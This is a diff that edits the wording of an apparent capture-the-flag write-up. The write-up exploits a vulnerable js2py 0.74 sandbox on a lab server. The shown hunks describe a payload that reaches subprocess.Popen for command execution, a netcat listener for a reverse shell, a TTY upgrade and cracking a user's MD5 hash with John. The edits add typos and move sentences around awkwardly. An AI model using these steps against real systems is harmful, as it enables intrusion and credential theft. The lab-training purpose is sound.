@@ -55,7 +55,7 @@ Downloading the app archive and extracting it reveals the source code and depend
 
 ![](./screens/2.png)
 
-**Vulnerable `js2py` version identified in `requirements.txt`:**
+**Vulnerable `js2py` version 0.74 in `requirements.txt`:**
 
 ```
 flask==3.0.3
@@ -80,7 +80,7 @@ Registering an account exposes a JavaScript code editor.
 
 ### Exploitation
 
-The following payload traverses Python's class hierarchy to locate and invoke `subprocess.Popen`, executing an arbitrary shell command:
+The following payload traverses Python's class hierarchy to locate and invoke `subprocess.Popen`, executing an arbitrary shell command.
 
 ```javascript
 // [+] command goes here:
@@ -112,7 +112,7 @@ console.log(n11)
 n11
 ```
 
-Set up a listener and submit the payload through the editor:
+The payload can be leveraged to get a reverse shell on the server, successfully escaping the sandbox enviroment.
 
 ```
 nc -lvnp 9001
@@ -120,14 +120,13 @@ nc -lvnp 9001
 
 ![](./screens/5.png)
 
-Shell obtained as `app`. Upgraded to a full interactive TTY:
+Shell obtained as `app`. Upgraded to a full interactive TTY.
 
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 ---
-
 ## Lateral Movement
 
 A SQLite database is found in the `instance` directory:
@@ -140,7 +139,7 @@ The database contains MD5 password hashes for registered users.
 
 ![](./screens/8.png)
 
-Saving marco's hash and cracking it with John:
+Saving marco's hash.
 
 ```
 john --show --format=Raw-MD5 marco.txt
@@ -148,7 +147,8 @@ john --show --format=Raw-MD5 marco.txt
 
 1 password hash cracked, 0 left
 ```
-
+ cracking it with John reverals the password.
+ 
 ---
 
 ## User Flag
